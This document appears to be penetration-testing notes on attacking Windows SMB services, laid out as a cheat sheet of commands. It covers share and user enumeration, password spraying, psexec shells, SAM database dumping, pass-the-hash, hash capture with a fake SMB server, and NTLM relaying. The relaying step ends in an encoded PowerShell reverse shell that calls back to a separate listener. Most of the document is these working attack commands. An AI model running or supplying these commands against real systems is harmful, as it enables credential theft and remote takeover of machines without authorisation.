Enumerate shares with smbclient

```
smbclient -N -L //10.129.14.128
```

Do the same with smbmap
```
smbmap -H 10.129.14.128
```

Enumerate folders/files in the share notes

```
smbmap -H 10.129.14.128 -r notes
```

Download a file
```
smbmap -H 10.129.14.128 --download "notes\note.txt"
```

Upload one
```
smbmap -H 10.129.14.128 --upload test.txt "notes\test.txt"
```

Execute RPC commands over SMB by using rpclient

```
rpcclient -U'%' 10.10.110.17
enumdomusers
```
A nice reference here: https://www.willhackforsushi.com/sec504/SMB-Access-from-Linux.pdf

enum4linux enumerates usefull information using (rpclient, smbclient,...)

```
./enum4linux-ng.py 10.10.11.45 -A -C
```

password spraying with crackmapexec (try a password for multiple users)

```
crackmapexec smb 10.10.110.17 -u /tmp/userlist.txt -p 'Company01!' --local-auth
```

We can execute commands over SMB using a few different tools:

* Impacket PsExec - Python PsExec like functionality example using RemComSvc.
* Impacket SMBExec - A similar approach to PsExec without using RemComSvc. The technique is described here. This implementation goes one step further, instantiating a local SMB server to receive the output of the commands. This is useful when the target machine does NOT have a writeable share available.
* Impacket atexec - This example executes a command on the target machine through the Task Scheduler service and returns the output of the executed command.
* CrackMapExec - includes an implementation of smbexec and atexec.
Metasploit PsExec - Ruby PsExec implementation.

using impacket psexec to get a shell over SMB:
```
impacket-psexec administrator:'Password123!'@10.10.110.17
```

Enumeate logged on users of an entire subnet given they same the same local admin credentials:

```
crackmapexec smb 10.10.110.0/24 -u administrator -p 'Password123!' --loggedon-users
```

Dump the sam database

```
crackmapexec smb 10.10.110.17 -u administrator -p 'Password123!' --sam
```

We can also Pass-The-Hash if we know the user's NTLM hash but not the password:

```
crackmapexec smb 10.10.110.17 -u Administrator -H 2B576ACBE6BCFDA7294D6BD18041B8FE
```

# Fake SMB server to steal NTLM hashes

```
sudo responder -I ens33
```

We can dump the hashes or relay the hash to a target server to impersonate the user via

```
#Dumps the SAM database
impacket-ntlmrelayx --no-http-server -smb2support -t 10.10.110.146

#Executes a reverse shell
impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.220.146 -c 'powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADIALgAxADYAOAAuADIAMgAwAC4AMQAzADMAIgAsADkAMAAwADEAKQA7ACQAcwB0AHIAZQBhAG0AIAA9ACAAJABjAGwAaQBlAG4AdAAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AFsAYgB5AHQAZQBbAF0AXQAkAGIAeQB0AGUAcwAgAD0AIAAwAC4ALgA2ADUANQAzADUAfAAlAHsAMAB9ADsAdwBoAGkAbABlACgAKAAkAGkAIAA9ACAAJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAKAAkAGIAeQB0AGUAcwAsACAAMAAsACAAJABiAHkAdABlAHMALgBMAGUAbgBnAHQAaAApACkAIAAtAG4AZQAgADAAKQB7ADsAJABkAGEAdABhACAAPQAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AVAB5AHAAZQBOAGEAbQBlACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQQBTAEMASQBJAEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIAeQB0AGUAcwAsADAALAAgACQAaQApADsAJABzAGUAbgBkAGIAYQBjAGsAIAA9ACAAKABpAGUAeAAgACQAZABhAHQAYQAgADIAPgAmADEAIAB8ACAATwB1AHQALQBTAHQAcgBpAG4AZwAgACkAOwAkAHMAZQBuAGQAYgBhAGMAawAyACAAPQAgACQAcwBlAG4AZABiAGEAYwBrACAAKwAgACIAUABTACAAIgAgACsAIAAoAHAAdwBkACkALgBQAGEAdABoACAAKwAgACIAPgAgACIAOwAkAHMAZQBuAGQAYgB5AHQAZQAgAD0AIAAoAFsAdABlAHgAdAAuAGUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AEIAeQB0AGUAcwAoACQAcwBlAG4AZABiAGEAYwBrADIAKQA7ACQAcwB0AHIAZQBhAG0ALgBXAHIAaQB0AGUAKAAkAHMAZQBuAGQAYgB5AHQAZQAsADAALAAkAHMAZQBuAGQAYgB5AHQAZQAuAEwAZQBuAGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA'

```

